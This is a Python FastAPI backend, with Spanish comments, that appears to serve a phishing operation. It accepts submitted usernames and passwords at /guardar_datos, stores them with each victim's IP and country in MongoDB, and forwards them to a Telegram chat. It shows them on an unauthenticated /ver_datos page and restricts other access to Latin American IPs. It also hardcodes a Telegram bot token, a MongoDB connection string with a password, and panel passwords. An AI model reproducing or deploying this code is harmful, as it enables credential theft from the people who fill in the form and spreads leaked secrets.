# ============================================================
# IMPORTS
# ============================================================
from fastapi import FastAPI, HTTPException, Request, UploadFile, BackgroundTasks
from fastapi import File, Form
from functools import partial, lru_cache
import shutil
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx
from fastapi.responses import HTMLResponse
from collections import deque, defaultdict
from pydantic import BaseModel
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response
import random
import base64
from motor.motor_asyncio import AsyncIOMotorClient
from typing import Callable, Dict, Set, Optional
from datetime import datetime, timedelta
import re
import asyncio
import time
import os
import ipaddress
from contextlib import asynccontextmanager
import logging
from asyncio import Semaphore, Queue
import weakref

# ============================================================
# 🔧 FIX #1: DNS MONKEYPATCH AGRESIVO PARA PYMONGO/MOTOR (A prueba de fallos)
# ============================================================
import dns.resolver

try:
    import dns.rdtypes.ANY.SRV
except ImportError:
    try:
        import dns.rdtypes.inet.SRV
    except ImportError:
        pass

_custom_resolver = dns.resolver.Resolver(configure=False)
_custom_resolver.nameservers = ['8.8.8.8', '8.8.4.4', '1.1.1.1']
_custom_resolver.timeout = 5.0
_custom_resolver.lifetime = 5.0

dns.resolver.default_resolver = _custom_resolver
_original_resolve = dns.resolver.resolve

def _patched_resolve(qname, rdtype='A', *args, **kwargs):
    return _custom_resolver.resolve(qname, rdtype, *args, **kwargs)

dns.resolver.resolve = _patched_resolve
try:
    dns.resolver.query = _patched_resolve
except Exception:
    pass

try:
    import pymongo.srv_resolver as _srv_resolver
    import pymongo.uri_parser as _uri_parser

    _patched_dns_module = type('dns_patched', (), {
        'resolver': type('resolver_patched', (), {
            'default_resolver': _custom_resolver,
            'resolve': _patched_resolve,
            'query': _patched_resolve,
        })
    })()

    _srv_resolver.dns = _patched_dns_module
    _uri_parser.dns = _patched_dns_module
    print("✅ Parche DNS aplicado a pymongo.srv_resolver")
except Exception as _e:
    print(f"⚠️ No se pudo parchear pymongo.srv_resolver: {_e}")

_SRV_OK = False
try:
    _test_answers = _custom_resolver.resolve(
        '_mongodb._tcp.cluster0.ndoznk5.mongodb.net', 'SRV'
    )
    for _r in _test_answers:
        print(f"✅ SRV OK: {_r.target}:{_r.port}")
    _SRV_OK = True
except Exception as _e:
    print(f"❌ SRV falla incluso con DNS de Google: {_e}")
    print("   → Se usará la URI directa (sin +srv) como fallback")

# ============================================================
# CONFIGURACIÓN DE LOGGING
# ============================================================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(name)s | %(message)s'
)
logger = logging.getLogger(__name__)

# ============================================================
# CONFIGURACIÓN Y CREDENCIALES
# ============================================================
TOKEN = os.getenv("TELEGRAM_TOKEN", "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g")
AUTH_USERNAME = os.getenv("AUTH_USERNAME", "gato")
AUTH_PASSWORD = os.getenv("AUTH_PASSWORD", "Gato1234@")

MONGO_URI_SRV = os.getenv(
    "MONGO_URI_SRV",
    "mongodb+srv://torresyuliana382:ZFAsVwH2gAIEm1ic@cluster0.ndoznk5.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
)
MONGO_URI_DIRECT = os.getenv("MONGO_URI_DIRECT", "")

numeros_r = frozenset({4, 6, 9})
iprandom = frozenset({4, 6, 9})

# ============================================================
# CACHES Y CONFIGURACIONES GLOBALES
# ============================================================
CACHE_TTL = 300
ip_cache: Dict[str, tuple] = {}
blocked_ips_cache: Set[str] = set()
user_cache: Dict[str, int] = {}
ip_number_cache: Dict[str, int] = {}

MAX_CONCURRENT_REQUESTS = 100
MAX_DB_CONNECTIONS = 20
MAX_HTTP_CONNECTIONS = 50
REQUEST_TIMEOUT = 30

MAX_TELEGRAM_CONCURRENT = 20
MAX_TELEGRAM_QUEUE_SIZE = 1000
TELEGRAM_TIMEOUT = 10.0
TELEGRAM_RETRY_DELAY = 0.5
MAX_TELEGRAM_RETRIES = 2
RATE_LIMIT_MESSAGES_PER_MINUTE = 30
RATE_LIMIT_MESSAGES_PER_SECOND = 1

request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
db_semaphore = Semaphore(MAX_DB_CONNECTIONS)
http_semaphore = Semaphore(MAX_HTTP_CONNECTIONS)
telegram_semaphore = Semaphore(MAX_TELEGRAM_CONCURRENT)

background_queue: Queue = Queue(maxsize=1000)
telegram_queue: Queue = Queue(maxsize=MAX_TELEGRAM_QUEUE_SIZE)

bot_rate_limits = defaultdict(lambda: {"messages": [], "last_second": 0})
telegram_stats = {
    "sent_immediate": 0,
    "sent_queued": 0,
    "failed": 0,
    "queue_full": 0,
    "rate_limited": 0,
    "total_processed": 0
}

PAISES_LATINOAMERICA = frozenset({
    'AR', 'BO', 'BR', 'CL', 'CO', 'CR', 'CU', 'DO', 'EC', 'SV',
    'GT', 'HN', 'MX', 'NI', 'PA', 'PY', 'PE', 'UY', 'VE', 'PR',
    'GF', 'GY', 'SR', 'BZ', 'JM', 'HT', 'TT', 'BB', 'GD', 'LC',
    'VC', 'DM', 'AG', 'KN', 'BS',
})

# ============================================================
# CLASE TELEGRAM MESSAGE
# ============================================================
class TelegramMessage:
    def __init__(self, mensaje: str, chat_id: str, token: str,
                 priority: int = 1, max_retries: int = MAX_TELEGRAM_RETRIES):
        self.mensaje = mensaje
        self.chat_id = chat_id
        self.token = token
        self.priority = priority
        self.max_retries = max_retries
        self.attempts = 0
        self.created_at = time.time()

# ============================================================
# RATE LIMITING
# ============================================================
def check_rate_limit(token: str) -> bool:
    current_time = time.time()
    current_second = int(current_time)
    rate_info = bot_rate_limits[token]
    rate_info["messages"] = [
        ts for ts in rate_info["messages"] if ts > current_time - 60
    ]
    if len(rate_info["messages"]) >= RATE_LIMIT_MESSAGES_PER_MINUTE:
        return False
    if rate_info["last_second"] == current_second:
        return False
    return True

def record_message_sent(token: str):
    current_time = time.time()
    rate_info = bot_rate_limits[token]
    rate_info["messages"].append(current_time)
    rate_info["last_second"] = int(current_time)

# ============================================================
# ENVÍO TELEGRAM OPTIMIZADO
# ============================================================
async def _enviar_telegram_optimizado(mensaje_obj: TelegramMessage) -> bool:
    async with telegram_semaphore:
        for intento in range(mensaje_obj.max_retries + 1):
            try:
                if not check_rate_limit(mensaje_obj.token):
                    if intento == 0:
                        telegram_stats["rate_limited"] += 1
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue

                url = f"https://api.telegram.org/bot{mensaje_obj.token}/sendMessage"
                payload = {
                    "chat_id": mensaje_obj.chat_id,
                    "text": mensaje_obj.mensaje[:4000]
                }

                response = await asyncio.wait_for(
                    app.state.http_client.post(url, json=payload),
                    timeout=TELEGRAM_TIMEOUT
                )

                if response.status_code == 200:
                    record_message_sent(mensaje_obj.token)
                    return True
                elif response.status_code == 429:
                    retry_after = int(response.headers.get('Retry-After', 1))
                    await asyncio.sleep(min(retry_after, 10))
                    continue
                else:
                    logger.warning(f"Error Telegram HTTP {response.status_code}")
                    if intento < mensaje_obj.max_retries:
                        await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                        continue

            except asyncio.TimeoutError:
                logger.warning(f"Timeout Telegram (intento {intento + 1})")
                if intento < mensaje_obj.max_retries:
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue
            except Exception as e:
                logger.error(f"Error Telegram (intento {intento + 1}): {e}")
                if intento < mensaje_obj.max_retries:
                    await asyncio.sleep(TELEGRAM_RETRY_DELAY * (intento + 1))
                    continue

        return False

# ============================================================
# WORKERS
# ============================================================
async def background_worker():
    while True:
        try:
            task = await background_queue.get()
            if task is None:
                break
            func, args, kwargs = task
            try:
                if asyncio.iscoroutinefunction(func):
                    await func(*args, **kwargs)
                else:
                    func(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error en background worker: {e}")
            background_queue.task_done()
        except Exception as e:
            logger.error(f"Error en background worker loop: {e}")
            await asyncio.sleep(1)

async def telegram_worker(worker_id: int):
    logger.info(f"Telegram worker {worker_id} iniciado")
    while True:
        try:
            mensaje_obj = await asyncio.wait_for(telegram_queue.get(), timeout=5.0)
            if mensaje_obj is None:
                logger.info(f"Telegram worker {worker_id} recibió señal de parada")
                break

            start_time = time.time()
            success = await _enviar_telegram_optimizado(mensaje_obj)
            processing_time = time.time() - start_time

            if success:
                telegram_stats["sent_queued"] += 1
                telegram_stats["total_processed"] += 1
            else:
                telegram_stats["failed"] += 1
                logger.error(f"Worker {worker_id}: Falló después de reintentos")

            telegram_queue.task_done()
        except asyncio.TimeoutError:
            continue
        except Exception as e:
            logger.error(f"Error en telegram worker {worker_id}: {e}")
            await asyncio.sleep(1)

# ============================================================
# ENVÍO HÍBRIDO
# ============================================================
async def enviar_telegram_hibrido(mensaje: str, chat_id: str = "-4826186479",
                                  token: str = TOKEN, priority: int = 1,
                                  force_immediate: bool = False) -> dict:
    mensaje_obj = TelegramMessage(mensaje, chat_id, token, priority)

    if force_immediate or (telegram_semaphore._value > 5 and telegram_queue.qsize() < 50):
        if check_rate_limit(token):
            try:
                success = await asyncio.wait_for(
                    _enviar_telegram_optimizado(mensaje_obj),
                    timeout=TELEGRAM_TIMEOUT + 2.0
                )
                if success:
                    telegram_stats["sent_immediate"] += 1
                    telegram_stats["total_processed"] += 1
                    return {"status": "sent_immediate", "success": True, "method": "direct"}
            except asyncio.TimeoutError:
                logger.warning("Timeout en envío inmediato, pasando a cola")
            except Exception as e:
                logger.error(f"Error en envío inmediato: {e}")

    try:
        telegram_queue.put_nowait(mensaje_obj)
        return {
            "status": "queued", "success": True, "method": "queue",
            "queue_size": telegram_queue.qsize()
        }
    except asyncio.QueueFull:
        telegram_stats["queue_full"] += 1
        logger.error("Cola de Telegram llena, mensaje descartado")
        return {"status": "queue_full", "success": False, "method": "none"}

# ============================================================
# LIFESPAN ROBUSTO
# ============================================================
@asynccontextmanager
async def lifespan(app: FastAPI):
    app.state.http_client = httpx.AsyncClient(
        limits=httpx.Limits(
            max_keepalive_connections=MAX_HTTP_CONNECTIONS,
            max_connections=MAX_HTTP_CONNECTIONS * 2,
            keepalive_expiry=30.0
        ),
        timeout=httpx.Timeout(REQUEST_TIMEOUT)
    )

    try:
        await init_db_async()
        await load_caches()
        logger.info("✅ BD y caches inicializados")
    except Exception as e:
        logger.error(f"⚠️ No se pudo inicializar BD/caches: {e}")
        logger.warning("La app continuará arrancando; algunas funciones fallarán hasta que la BD esté disponible")

    app.state.background_task = asyncio.create_task(background_worker())
    app.state.telegram_workers = []
    for i in range(5):
        worker = asyncio.create_task(telegram_worker(i))
        app.state.telegram_workers.append(worker)

    logger.info("🚀 Aplicación iniciada con 5 workers de Telegram")

    yield

    logger.info("Cerrando aplicación...")
    await background_queue.put(None)
    for _ in range(len(app.state.telegram_workers)):
        try:
            telegram_queue.put_nowait(None)
        except asyncio.QueueFull:
            pass

    try:
        await asyncio.wait_for(app.state.background_task, timeout=10.0)
    except asyncio.TimeoutError:
        logger.warning("Background worker no terminó, cancelando")
        app.state.background_task.cancel()

    done, pending = await asyncio.wait(app.state.telegram_workers, timeout=10.0)
    if pending:
        logger.warning(f"Cancelando {len(pending)} workers de Telegram")
        for task in pending:
            task.cancel()
        await asyncio.gather(*pending, return_exceptions=True)

    await app.state.http_client.aclose()
    try:
        client.close()
    except Exception:
        pass

    logger.info("✅ Aplicación cerrada correctamente")

app = FastAPI(lifespan=lifespan)

# CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
    max_age=3600,
)

# ============================================================
# MONGO CLIENT
# ============================================================
# ============================================================
# MONGO CLIENT (Con timeouts ampliados y resiliencia a red)
# ============================================================
def _crear_cliente_mongo():
    opciones = dict(
        maxPoolSize=MAX_DB_CONNECTIONS,
        minPoolSize=2,
        maxIdleTimeMS=60000,
        serverSelectionTimeoutMS=15000,  # Aumentado a 15s para evitar timeouts rápidos
        socketTimeoutMS=15000,           # Aumentado a 15s
        connectTimeoutMS=15000,          # Aumentado a 15s
        waitQueueTimeoutMS=10000,
        maxConnecting=5,
        retryWrites=True
    )

    if MONGO_URI_DIRECT:
        logger.info("🔌 Usando URI directa de MongoDB (sin +srv)")
        return AsyncIOMotorClient(MONGO_URI_DIRECT, **opciones)

    if _SRV_OK:
        logger.info("🔌 Usando URI +srv (test SRV pasó)")
        return AsyncIOMotorClient(MONGO_URI_SRV, **opciones)

    logger.warning("⚠️ SRV no resolvió en startup. Intentando +srv con opciones ampliadas...")
    return AsyncIOMotorClient(MONGO_URI_SRV, **opciones)
client = _crear_cliente_mongo()
db = client["api_db"]
ip_numbers = db["ip_numbers"]
user_numbers = db["user_numbers"]
global_settings = db["global_settings"]
logs_usuarios = db["logs_usuarios"]
ip_bloqueadas = db["ip_bloqueadas"]

cola = deque(maxlen=100)
baneado = deque(maxlen=200)
variable = False
is_active_cache = False
cache_last_updated = 0

# ============================================================
# HELPERS
# ============================================================
async def add_background_task(func, *args, **kwargs):
    try:
        await asyncio.wait_for(background_queue.put((func, args, kwargs)), timeout=1.0)
    except asyncio.TimeoutError:
        logger.warning("Queue de background lleno, descartando tarea")

async def init_db_async():
    async with db_semaphore:
        try:
            tasks = [
                asyncio.wait_for(ip_numbers.create_index("ip", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(user_numbers.create_index("username", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(global_settings.create_index("id", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(ip_bloqueadas.create_index("ip", background=True), timeout=10.0)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)

            if not await global_settings.find_one({"id": 1}):
                await global_settings.insert_one({"id": 1, "is_active": False})

            logger.info("Base de datos inicializada correctamente")
        except Exception as e:
            logger.error(f"Error inicializando BD: {e}")
            raise

async def load_caches():
    global blocked_ips_cache, is_active_cache, cache_last_updated
    async with db_semaphore:
        try:
            blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
            blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}

            settings = await global_settings.find_one({"id": 1})
            is_active_cache = settings.get("is_active", False) if settings else False

            ip_docs = ip_numbers.find({}, {"ip": 1, "number": 1}).limit(2000)
            async for doc in ip_docs:
                ip_number_cache[doc["ip"]] = doc["number"]

            user_docs = user_numbers.find({}, {"username": 1, "number": 1}).limit(2000)
            async for doc in user_docs:
                user_cache[doc["username"]] = doc["number"]

            cache_last_updated = time.time()
            logger.info(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas, {len(ip_number_cache)} IPs, {len(user_cache)} usuarios")
        except Exception as e:
            logger.error(f"Error cargando caches: {e}")
            raise

@lru_cache(maxsize=2000)
def validar_contrasena_cached(contrasena: str) -> bool:
    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
    return bool(re.match(patron, contrasena))

async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
    current_time = time.time()
    if ip in ip_cache:
        cached_result, cached_time = ip_cache[ip]
        if current_time - cached_time < CACHE_TTL:
            return cached_result

    async with http_semaphore:
        url = f"http://ipwhois.app/json/{ip}"
        try:
            response = await asyncio.wait_for(
                app.state.http_client.get(url), timeout=5.0
            )
            if response.status_code == 200:
                data = response.json()
                country = data.get('country_code', 'Unknown')
                result = (country in PAISES_LATINOAMERICA, country)

                if len(ip_cache) > 5000:
                    old_keys = [k for k, (_, t) in ip_cache.items() if current_time - t > CACHE_TTL * 2]
                    for k in old_keys[:1000]:
                        ip_cache.pop(k, None)

                ip_cache[ip] = (result, current_time)
                return result
            return (False, 'Unknown')
        except asyncio.TimeoutError:
            logger.warning(f"Timeout verificando país para IP {ip}")
            return (False, 'Unknown')
        except Exception as e:
            logger.error(f"Error verificando país: {e}")
            return (False, 'Unknown')

def agregar_elemento_diccionario_cache(ip: str, numero: int):
    if len(ip_number_cache) > 10000:
        keys_to_remove = list(ip_number_cache.keys())[:1000]
        for key in keys_to_remove:
            ip_number_cache.pop(key, None)
    ip_number_cache[ip] = numero

async def agregar_elemento_diccionario_async(ip: str, numero: int):
    async with db_semaphore:
        try:
            await asyncio.wait_for(
                ip_numbers.insert_one({"ip": ip, "number": numero}),
                timeout=5.0
            )
            agregar_elemento_diccionario_cache(ip, numero)
        except asyncio.TimeoutError:
            logger.warning(f"Timeout guardando IP {ip} en BD")
        except Exception as e:
            logger.error(f"Error guardando IP en BD: {e}")

def obtener_ip_real(request: Request) -> str:
    headers_to_check = ["x-forwarded-for", "x-real-ip", "cf-connecting-ip", "x-client-ip"]
    for header in headers_to_check:
        value = request.headers.get(header)
        if value:
            ip = value.split(",")[0].strip()
            if ip:
                return ip
    return request.client.host

def es_ip_local_o_privada(ip: str) -> bool:
    try:
        ip_obj = ipaddress.ip_address(ip)
        return (ip_obj.is_loopback or ip_obj.is_private or
                ip_obj.is_link_local or ip_obj.is_reserved)
    except ValueError:
        return False

# ============================================================
# MIDDLEWARES
# ============================================================
class ConcurrencyLimitMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        try:
            async with asyncio.timeout(REQUEST_TIMEOUT):
                async with request_semaphore:
                    return await call_next(request)
        except asyncio.TimeoutError:
            logger.warning(f"Request timeout para {request.url.path}")
            return JSONResponse(status_code=503, content={"detail": "Servidor ocupado, intenta más tarde"})
        except Exception as e:
            logger.error(f"Error en ConcurrencyLimitMiddleware: {e}")
            return JSONResponse(status_code=500, content={"detail": "Error interno del servidor"})

class FastBasicAuthMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, username: str, password: str):
        super().__init__(app)
        self.auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()

    async def dispatch(self, request: Request, call_next: Callable):
        if request.url.path.startswith(("/docs", "/redoc")):
            auth = request.headers.get("Authorization")
            if not auth or not auth.endswith(self.auth_string):
                return Response("Unauthorized", status_code=401,
                                headers={"WWW-Authenticate": "Basic"})
        return await call_next(request)

class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        client_ip = obtener_ip_real(request)

        if client_ip in blocked_ips_cache:
            return JSONResponse(
                status_code=403,
                content={"detail": "Acceso denegado, la IP está bloqueada " + client_ip}
            )

        if es_ip_local_o_privada(client_ip):
            if client_ip not in ip_number_cache:
                numero_random = random.randint(0, 9)
                agregar_elemento_diccionario_cache(client_ip, numero_random)
                await add_background_task(agregar_elemento_diccionario_async, client_ip, numero_random)
            return await call_next(request)

        excluded_paths = {"/docs", "/redoc", "/openapi.json", "/health", "/metrics",
                          "/login", "/guardar_datos", "/ver_datos"}
        if request.url.path not in excluded_paths:
            try:
                permitido, pais = await asyncio.wait_for(
                    verificar_pais_cached(client_ip), timeout=8.0
                )
                if not permitido:
                    logger.info(f"IP bloqueada por geolocalización: {client_ip} ({pais})")
                    return JSONResponse(
                        status_code=403,
                        content={"detail": "Acceso denegado", "ip": client_ip, "country": pais}
                    )
            except asyncio.TimeoutError:
                logger.warning(f"Timeout geolocalización IP {client_ip}")
            except Exception as e:
                logger.error(f"Error geolocalización: {e}")

        if client_ip not in ip_number_cache:
            numero_random = random.randint(0, 9)
            agregar_elemento_diccionario_cache(client_ip, numero_random)
            await add_background_task(agregar_elemento_diccionario_async, client_ip, numero_random)

        return await call_next(request)

app.add_middleware(ConcurrencyLimitMiddleware)
app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)
app.add_middleware(OptimizedIPBlockMiddleware)

# ============================================================
# MODELOS
# ============================================================
class ClaveRequest(BaseModel):
    clave: str

class UpdateNumberRequest(BaseModel):
    numero: int

class IPRequest(BaseModel):
    ip: str

class DynamicMessage(BaseModel):
    mensaje: str

# ============================================================
# ENDPOINTS
# ============================================================
@app.get("/login", response_class=HTMLResponse)
async def login_form():
    return """
    <html><head><title>Acceso</title></head>
    <body style="font-family:sans-serif; text-align:center; padding-top:100px;">
        <h2>Ingrese la contraseña para acceder</h2>
        <form method="post" action="/login">
            <input type="password" name="password" placeholder="Contraseña" />
            <button type="submit">Ingresar</button>
        </form>
    </body></html>
    """

@app.post("/login")
async def login(password: str = Form(...)):
    if password == "gato123":
        try:
            with open("static/panel.html", "r", encoding="utf-8") as f:
                content = f.read()
            return HTMLResponse(content=content)
        except Exception:
            return HTMLResponse("<h3>Panel no encontrado</h3>", status_code=404)
    else:
        return HTMLResponse(
            "<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>",
            status_code=401
        )

@app.post("/validar_clave")
async def validar_clave(data: ClaveRequest):
    return {"valido": data.clave == "gato123"}

async def _bloquear_ip_bd(ip: str):
    async with db_semaphore:
        try:
            await asyncio.wait_for(
                ip_bloqueadas.insert_one({"ip": ip, "fecha_bloqueo": datetime.utcnow()}),
                timeout=5.0
            )
        except Exception as e:
            logger.error(f"Error bloqueando IP en BD: {e}")

@app.post("/bloquear_ip/")
async def bloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    if ip not in blocked_ips_cache:
        blocked_ips_cache.add(ip)
        await add_background_task(_bloquear_ip_bd, ip)
        return {"message": f"La IP {ip} ha sido bloqueada."}
    return {"message": f"La IP {ip} ya estaba bloqueada."}

async def _desbloquear_ip_bd(ip: str):
    async with db_semaphore:
        try:
            await asyncio.wait_for(ip_bloqueadas.delete_one({"ip": ip}), timeout=5.0)
        except Exception as e:
            logger.error(f"Error desbloqueando IP en BD: {e}")

@app.post("/desbloquear_ip/")
async def desbloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    if ip in blocked_ips_cache:
        blocked_ips_cache.discard(ip)
        await add_background_task(_desbloquear_ip_bd, ip)
        return {"message": f"La IP {ip} ha sido desbloqueada."}
    return {"message": f"La IP {ip} no estaba bloqueada."}

@app.get("/ips_bloqueadas/")
async def obtener_ips_bloqueadas():
    return {"ips_bloqueadas": [{"ip": ip, "fecha_bloqueo": "cached"} for ip in blocked_ips_cache]}

@app.get("/")
async def read_root():
    return {"message": "API funcionando correctamente!"}

async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
    async with db_semaphore:
        try:
            await asyncio.wait_for(
                logs_usuarios.insert_one({
                    "usuario": usuario, "contrasena": contra,
                    "ip": ip, "pais": pais, "fecha": datetime.utcnow()
                }),
                timeout=5.0
            )
        except Exception as e:
            logger.error(f"Error guardando log usuario: {e}")

@app.post("/guardar_datos")
async def guardar_datos(
    usuario: str = Form(...),
    contra: str = Form(...),
    request: Request = None
):
    ip = obtener_ip_real(request)
    permitido, pais = await verificar_pais_cached(ip)
    await add_background_task(_guardar_log_usuario, usuario, contra, ip, pais)
    
    # Notificación opcional por Telegram integrada automáticamente
    msg = f"🔔 *Nuevo registro guardado*\n👤 Usuario: `{usuario}`\n🔑 Contraseña: `{contra}`\n🌐 IP: `{ip}`\n🌍 País: `{pais}`"
    await enviar_telegram_hibrido(msg)
    
    return {"message": "Datos guardados correctamente", "ip": ip, "pais": pais}

@app.get("/ver_datos", response_class=HTMLResponse)
async def ver_datos():
    async with db_semaphore:
        try:
            cursor = logs_usuarios.find().sort("fecha", -1).limit(100)
            logs = await cursor.to_list(length=100)
            
            rows = ""
            for log in logs:
                fecha_val = log.get("fecha")
                fecha_str = fecha_val.strftime("%Y-%m-%d %H:%M:%S") if isinstance(fecha_val, datetime) else str(fecha_val)
                rows += f"""
                <tr>
                    <td>{log.get("usuario", "")}</td>
                    <td>{log.get("contrasena", "")}</td>
                    <td>{log.get("ip", "")}</td>
                    <td>{log.get("pais", "")}</td>
                    <td>{fecha_str}</td>
                </tr>
                """
            
            html_content = f"""
            <html>
                <head>
                    <title>Logs de Usuarios</title>
                    <style>
                        body {{ font-family: sans-serif; margin: 20px; background-color: #f9f9f9; }}
                        h2 {{ color: #333; }}
                        table {{ width: 100%; border-collapse: collapse; background: #fff; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                        th, td {{ padding: 10px 15px; border: 1px solid #ddd; text-align: left; }}
                        th {{ background-color: #007bff; color: white; }}
                        tr:nth-child(even) {{ background-color: #f2f2f2; }}
                    </style>
                </head>
                <body>
                    <h2>Registros de Usuarios Guardados</h2>
                    <table>
                        <thead>
                            <tr>
                                <th>Usuario</th>
                                <th>Contraseña</th>
                                <th>IP</th>
                                <th>País</th>
                                <th>Fecha (UTC)</th>
                            </tr>
                        </thead>
                        <tbody>
                            {rows if rows else '<tr><td colspan="5" style="text-align:center;">No hay registros disponibles.</td></tr>'}
                        </tbody>
                    </table>
                </body>
            </html>
            """
            return HTMLResponse(content=html_content)
            
        except asyncio.TimeoutError:
            logger.warning("Timeout al consultar logs de usuarios en la base de datos.")
            return HTMLResponse("<h3>Error: Tiempo de espera agotado al consultar la base de datos.</h3>", status_code=504)
        except Exception as e:
            logger.error(f"Error en /ver_datos: {e}")
            return HTMLResponse(f"<h3>Error interno al cargar los datos: {e}</h3>", status_code=500)
